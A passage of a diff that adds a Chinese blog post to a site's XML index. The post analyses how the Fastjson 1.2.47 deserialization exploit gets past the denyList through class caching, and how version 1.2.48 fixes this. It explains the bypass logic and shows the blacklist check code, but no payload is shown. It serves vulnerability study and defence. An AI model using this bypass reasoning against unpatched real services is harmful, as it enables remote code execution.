+<p>关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类”com.sun.rowset.JdbcRowSetImpl”，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？</p>
+<p>我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>第一个判断条件<code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</p>
+<h1 id="1-2-48-修复"><a href="#1-2-48-修复" class="headerlink" title="1.2.48 修复"></a>1.2.48 修复</h1><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p>
+<p>运行会报错：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure>
+
+<p>调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p>
+<p>对比代码。修改了cache这一处。（右侧为1.2.47代码）</p>
+<p>本来应该进入一个loadClass（两个参数）的方法，然后默认cache为true，在进入三个参数的loadClass。</p>
+<p>现在这边直接指定过来三个参数loadClass同时cache为false。</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-705c34bc-2d01-1.jpg" alt="img"></p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-707ccdbc-2d01-1.jpg" alt="img"></p>
+<p>对于之前提到了第三处mapping不需要校验，1.2.48也不行了：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-70b6cd8c-2d01-1.jpg" alt="img"></p>
+<p>因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/12.png" alt="img"></p>
+<h1 id="1-2-48之后"><a href="#1-2-48之后" class="headerlink" title="1.2.48之后"></a>1.2.48之后</h1><p>在这个通杀payload之后，就又恢复了一片平静的，在服务端手动配置关闭白名单情况下的黑名单与绕过黑名单的战争。这个战争估计随着代码不断迭代，也是不会停止的。</p>
+<p>参考：</p>
+<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">mi1k7ea</a></p>
+<p><a href="https://xz.aliyun.com/t/7027#toc-18" target="_blank" rel="noopener">lalajun</a></p>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>搞懂JNDI</title>
     <url>/%E6%90%9E%E6%87%82JNDI/</url>
     <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
